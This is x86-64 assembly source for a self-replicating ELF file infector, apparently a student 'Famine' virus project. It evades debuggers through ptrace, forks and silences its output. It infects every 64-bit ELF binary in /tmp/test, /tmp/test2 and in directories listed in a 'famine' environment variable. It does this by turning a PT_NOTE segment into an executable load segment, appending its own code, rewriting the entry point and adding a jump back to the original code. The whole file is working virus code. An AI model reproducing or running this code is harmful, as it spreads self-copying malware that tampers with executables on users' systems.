%define SYS_WRITE   1
%define SYS_OPEN	2
%define SYS_CLOSE   3
%define SYS_CHDIR   80
%define SYS_EXIT    60
%define SYS_GETDENTS64 217
%define SYS_PREAD64 17
%define SYS_FSTAT   5
%define SYS_LSEEK   8
%define SYS_FORK    57
%define SYS_PWRITE64 18
%define SYS_SYNC    162
%define SYS_DUP2    33
%define SYS_PTRACE  101
%define FLAG_O_RDONLY 0
%define NULL        0

%define SUCCESS    0
%define ERROR      -1

section .text
    global _start

_start:
    mov rax, SYS_PTRACE
    mov rdi, 0
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    syscall
    cmp rax, 0
    jl safe_exit

    mov rax, SYS_FORK
    syscall

    test rax, rax ;check error or parent
    jnz safe_exit


    mov r12, rsp
    add r12, 8

    push rdx
    push rbp           ; save the base pointer
    mov rbp, rsp       ; set the base pointer to the current stack pointer
    sub rsp, 15000      ; reserving 15000 bytes
    mov r15, rsp       ; r15 = malloc(15000)

    call redirect_dev_null

    lea rsi, [rsp + 11000]

    mov byte [rsi + 0], '/'
    mov byte [rsi + 1], 't'
    mov byte [rsi + 2], 'm'
    mov byte [rsi + 3], 'p'
    mov byte [rsi + 4], '/'
    mov byte [rsi + 5], 't'
    mov byte [rsi + 6], 'e'
    mov byte [rsi + 7], 's'
    mov byte [rsi + 8], 't'
    mov byte [rsi + 9], 0

    mov rdi, rsi            ; rdi = pointer to "/tmp/test"

    call infect_dir
    
    lea rsi, [rsp + 11000]

    mov byte [rsi + 0], '/'
    mov byte [rsi + 1], 't'
    mov byte [rsi + 2], 'm'
    mov byte [rsi + 3], 'p'
    mov byte [rsi + 4], '/'
    mov byte [rsi + 5], 't'
    mov byte [rsi + 6], 'e'
    mov byte [rsi + 7], 's'
    mov byte [rsi + 8], 't'
    mov byte [rsi + 9], '2'
    mov byte [rsi + 10], 0 

    mov rdi, rsi            ; rdi = pointer to "/tmp/test2"

    call infect_dir

    call do_env

    call restore_stack ; exit

infect_dir:
    call chdir
    test rax, rax ; check for error
    js .failed ; if error, exit
    call open_dir
    test rax, rax ; check for error
    js .failed ; if error, exit
    call getdents
    test rax, rax ; check for error
    js .failed ; if error, exit
    xor rcx, rcx ; rcx = 0
    call iterate_loop ; iterate over directory entries
.failed:
    ret

open_dir:
    mov rax, SYS_OPEN ; syscall number for sys_open
    mov rsi, FLAG_O_RDONLY ; O_RDONLY
    syscall ; invoke operating system to open directory
    test rax, rax ; check for error
    js safe_exit ; if error, exit
    ret

chdir:
    mov rax, SYS_CHDIR ; syscall number for sys_chdir
    syscall ; invoke operating system to change directory
    ret

getdents:
    mov rdi, rax ; save file descriptor
    mov rax, SYS_GETDENTS64
    lea rsi, [r15 + 400] ; buffer to store directory entries
    mov rdx, 8192 ; size of buffer
    syscall ; invoke operating system to read directory entries
    test rax, rax ; check for error
    js safe_exit ; if error, exit

    mov qword [r15 + 350], rax ; save number of bytes read
    mov rax, SYS_CLOSE ; syscall number for sys_close
    syscall ; invoke operating system to close directory

    ret
iterate_loop:
    push rcx
    cmp byte [r15 + 418 + rcx], 8 ; check if d_type is DT_REG
    jne .go_to_next

    lea rdi, [rcx + r15 + 419] ; filename
    mov rsi, 2 ; O_RDWR
    mov rdx, 0 ; mode
    mov rax, SYS_OPEN ; syscall number for sys_open
    syscall ; invoke operating system to open file

    mov r9, rax ; save file descriptor
    cmp rax, 0 ; check for error
    jbe .go_to_next ; if error, go to next entry

    call pread ; read ELF header
    test rax, rax ; check for error
    jz .close_file ; if error, go to next entry

    ; check if it's an ELF file
    cmp dword [r15 + 144], 0x464c457f ; check if it's an ELF file (magic number)
    jnz .close_file ; if not, go to next entry

    cmp byte [r15 + 148], 0x2 ; check if it's a 64-bit ELF file
    jne .close_file ; if not, go to next entry

    cmp dword [r15 + 152], 0x004F4546
    je .close_file

    mov r8, [r15 + 176]
    mov rbx, 0
    mov r14, 0

    call find_phdr
    cmp rax, 2
    jne .close_file

    call get_target_phdr_file_offset
    call file_info

    mov rdi, r9
    mov rsi, 0
    mov rdx, 2
    mov rax, SYS_LSEEK
    syscall
    push rax

    call .delta
    .delta:
        pop r11
        sub r11, .delta

    mov rdi, r9
    lea rsi, [r11 + _start]
    mov rdx, safe_exit - _start
    mov r10, rax
    mov rax, SYS_PWRITE64
    syscall

    cmp rax, 0
    jbe .close_file

    pop rax
    mov r11, rax
    
    call patch_phdr
    test rax, rax
    js .close_file

    call patch_ehdr
    test rax, rax
    js .close_file

    call write_patched_jmp
    test rax, rax
    js .close_file

    .close_file:
        mov rax, SYS_CLOSE
        mov rdi, r9 ; file descriptor
        syscall ; invoke operating system to close file

    .go_to_next:
        pop rcx
        add cx, word [rcx + r15 + 416]
        cmp rcx, qword [r15 + 350]
        jne iterate_loop
ret

open_file:
    lea rdi, [rcx + r15 + 419] ; filename
    mov rsi, 2 ; O_RDWR
    mov rdx, 0 ; mode
    mov rax, SYS_OPEN ; syscall number for sys_open
    syscall ; invoke operating system to open file
    ret

pread:
    mov rdi, r9 ; file descriptor (use the correct file descriptor)
    lea rsi, [r15 + 144] ; buffer to store ELF header
    mov rdx, 64 ; size of ELF header
    mov r10, 0 ; offset (start of the file)
    mov rax, SYS_PREAD64 ; syscall number for sys_pread64
    syscall ; invoke operating system to read ELF header
    ret

find_phdr:
    mov rdi, r9 ; file descriptor
    lea rsi, [r15 + 208] ; buffer to store program header
    mov dx, word [r15 + 198] ; size of program header
    mov r10, r8 ; offset (start of program header)
    mov rax, SYS_PREAD64 ; syscall number for sys_pread64
    syscall ; invoke operating system to read program header

    cmp byte [r15 + 208], 4 ; check if it's a PT_NOTE segment
    jne .continue
    mov rax, 2
    ret; if yes, infect

    .continue:
        inc rbx ; increase program header counter
        cmp bx, word [r15 + 200] ; check if we looped through all program headers
        jl .continue2 ; if yes, close file
        mov rax, 3
        ret ; if no valid program header was found, close file

    .continue2:
        add r8w, word [r15 + 198] ; add size of program header to offset
        jnz find_phdr ; read next program header


get_target_phdr_file_offset:
    mov ax, bx
    mov dx, word [r15 + 198]
    imul dx
    mov r14w, ax
    add r14, [r15 + 176]
    mov rax, SUCCESS ; Indicate success
    ret

file_info:
    mov rdi, r9
    mov rsi, r15
    mov rax, SYS_FSTAT
    syscall
    test rax, rax
    js .error
    mov rax, SUCCESS
    ret
.error:
    mov rax, ERROR
    ret

patch_phdr:
    mov dword [r15 + 208], 1
    mov dword [r15 + 212], 2 | 4 | 1
    mov [r15 + 216], r11
    mov r13, [r15 + 48]
    add r13, 0xc000000
    mov [r15 + 224], r13
    mov qword [r15 + 256], 0x200000
    add qword [r15 + 240], safe_exit - _start + 5
    add qword [r15 + 248], safe_exit - _start + 5

    mov rdi, r9
    mov rsi, r15
    lea rsi, [r15 + 208]
    mov dx, word [r15 + 198]
    mov r10, r14
    mov rax, SYS_PWRITE64
    syscall
    cmp rax, 0
    jbe .error
    mov rax, SUCCESS
    ret
.error:
    mov rax, ERROR
    ret

patch_ehdr:
    mov r14, [r15 + 168]
    mov [r15 + 168], r13
    mov r13, 0x004F4546
    mov [r15 + 152], r13
    mov rdi, r9
    lea rsi, [r15 + 144]
    mov rdx, 64
    mov r10, 0
    mov rax, SYS_PWRITE64
    syscall
    cmp rax, 0
    jbe .error
    mov rax, SUCCESS
    ret
.error:
    mov rax, ERROR
    ret

write_patched_jmp:
    mov rdi, r9
    mov rsi, 0
    mov rdx, 2
    mov rax, SYS_LSEEK
    syscall

    mov rdx, [r15 + 224]
    add rdx, 5
    sub r14, rdx
    sub r14, safe_exit - _start
    mov byte [r15 + 300], 0xe9
    mov dword [r15 + 301], r14d

    mov rdi, r9
    lea rsi, [r15 + 300]
    mov rdx, 5
    mov r10, rax
    mov rax, SYS_PWRITE64
    syscall
    cmp rax, 0
    jbe .error

    mov rax, SYS_SYNC
    syscall
    mov rax, SUCCESS
    ret
.error:
    mov rax, ERROR
    ret

do_env:
.skip_argv:
    ; mov rax, [rbx]
    mov rax, [r12]
    test rax, rax
    je .after_argv
    add r12, 8
    jmp .skip_argv

.after_argv:
    add r12, 8

.find_famine:
    mov rsi, [r12]
    test rsi, rsi
    je .exit
    
    lea r9, [rsp + 11000]
    mov byte [r9 + 0], 'f'
    mov byte [r9 + 1], 'a'
    mov byte [r9 + 2], 'm'
    mov byte [r9 + 3], 'i'
    mov byte [r9 + 4], 'n'
    mov byte [r9 + 5], 'e'
    mov byte [r9 + 6], '='
    mov byte [r9 + 7], 0

    mov rdi, r9

    call ft_strncmp
    test rax, rax
    je .print_famine_value

    add r12, 8
    jmp .find_famine

.print_famine_value:
    call split_and_print
    jmp .exit

.exit:
    ret

ft_strncmp:
    mov rcx, 7
    repe cmpsb
    mov rax, rcx
    ret

split_and_print:
    mov rdi, rsi
    mov rsi, rdi
.split_loop:
    mov al, [rsi]
    test al, al
    je .done
    cmp al, ','
    je .print_word
    inc rsi
    jmp .split_loop

.print_word:
    mov byte [rsi], 0
    mov r12, rsi
    call infect_dir
.debug:    
    mov rsi, r12 
    inc rsi
    mov rdi, rsi
    jmp .split_loop

.done:
    call infect_dir
    ret

signature db "Famine version 1.0 (c)oded dec-2024 by gemartin-jareste", NULL

redirect_dev_null:
    lea r9, [rsp + 11000]
    mov byte [r9 + 0], '/'
    mov byte [r9 + 1], 'd'
    mov byte [r9 + 2], 'e'
    mov byte [r9 + 3], 'v'
    mov byte [r9 + 4], '/'
    mov byte [r9 + 5], 'n'
    mov byte [r9 + 6], 'u'
    mov byte [r9 + 7], 'l'
    mov byte [r9 + 8], 'l'
    mov byte [r9 + 9], 0

    mov rdi, r9

    mov rsi, 0
    mov rax, SYS_OPEN
    syscall
    mov rdi, rax

    mov rsi, 0
    mov rax, SYS_DUP2
    syscall

    mov rsi, 1
    mov rax, SYS_DUP2
    syscall

    mov rsi, 2
    mov rax, SYS_DUP2
    syscall

    mov rax, SYS_CLOSE
    syscall
    ret

restore_stack:
    mov rsp, rbp
    pop rbp
    pop rdx
    add rsp, 15000

safe_exit:
    xor rdi, rdi
    mov rax, SYS_EXIT
    syscall
